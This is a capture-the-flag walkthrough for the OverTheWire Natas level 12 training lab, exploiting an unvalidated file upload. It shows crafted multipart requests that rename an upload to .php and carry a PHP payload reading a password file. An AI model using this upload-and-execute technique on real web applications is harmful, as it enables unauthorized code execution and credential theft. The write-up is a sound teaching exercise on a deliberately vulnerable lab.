```
.%%..%%...%%%%...%%%%%%...%%%%....%%%%...........%%......%%%%%%..%%..%%..%%%%%%..%%..............%%....%%%%%%.
.%%%.%%..%%..%%....%%....%%..%%..%%..............%%......%%......%%..%%..%%......%%.............%%%.......%%..
.%%.%%%..%%%%%%....%%....%%%%%%...%%%%...........%%......%%%%....%%..%%..%%%%....%%..............%%......%%%..
.%%..%%..%%..%%....%%....%%..%%......%%..........%%......%%.......%%%%...%%......%%..............%%........%%.
.%%..%%..%%..%%....%%....%%..%%...%%%%...........%%%%%%..%%%%%%....%%....%%%%%%..%%%%%%........%%%%%%..%%%%%..
..............................................................................................................
```
Find the password for the user *natas13* to log in at
`http://natas13.natas.labs.overthewire.org` for the next level. [^1]

Solution
-----------------------------------------------------------------------------------------
After logging in to the *natas12* website, we are prompted with a JPEG file upload, so
we inspect there to be a file injection vulnerability. Without further testing, we have
a look at the source code and discover the interesting line as follows.
```html
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```
For our file injection, we want to change this `.jpg` extension somehow to a `.php`
extension during the upload. First, we want to investigate what happens if we upload a
regular image. For, that we download a picture from the internet and since it is likely
bigger than one 1KB, we need to resize it with
`convert linux_original.png -resize 5% -define jpeg:extent=1kb linux_resized.jpg`
accordingly. Now, we can upload the `linux_resized.jpg` picture an keep track of the
request as it is sent. Therefore, we can see, that the random filename is assigned at
the client side and the server does not validate the file type to actually be an image
at all. In order to test this, we can resend a modified request with a text.
```
------geckoformboundary9efc2594fb7e8d4b7a179c216322619a
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------geckoformboundary9efc2594fb7e8d4b7a179c216322619a
Content-Disposition: form-data; name="filename"

test-file.txt
------geckoformboundary9efc2594fb7e8d4b7a179c216322619a
Content-Disposition: form-data; name="uploadedfile"; filename="linux_resized.jpg"
Content-Type: image/jpeg

 This is a test if the text file is uploaded.
------geckoformboundary9efc2594fb7e8d4b7a179c216322619a--
```
And indeed, the file upload was successfull and we can even view the text file under
`/upload/2dfueqzu35.txt` with the "This is a test if the text file is uploaded." text.
Next, we can move on to uploading a malicious PHP file. For that, we resend the
request from earlier once again but modify it as follows.

```
------geckoformboundary9efc2594fb7e8d4b7a179c216322619a
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------geckoformboundary9efc2594fb7e8d4b7a179c216322619a
Content-Disposition: form-data; name="filename"

print-password.php
------geckoformboundary9efc2594fb7e8d4b7a179c216322619a
Content-Disposition: form-data; name="uploadedfile"; filename="linux_resized.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents("/etc/natas_webpass/natas13") ?>
------geckoformboundary9efc2594fb7e8d4b7a179c216322619a--
```
Note, that we only changed the filename to a PHP type and provided a print command to
view the password file for the next level. This request was successful and in the
*response* section of the new request, we can see the new file name, in our case it is
`http://natas12.natas.labs.overthewire.org/upload/gpznzhq3rb.php`. Upon navigating to
this URL, we get the next user's password.

[^1]: https://overthewire.org/wargames/natas/natas12.html
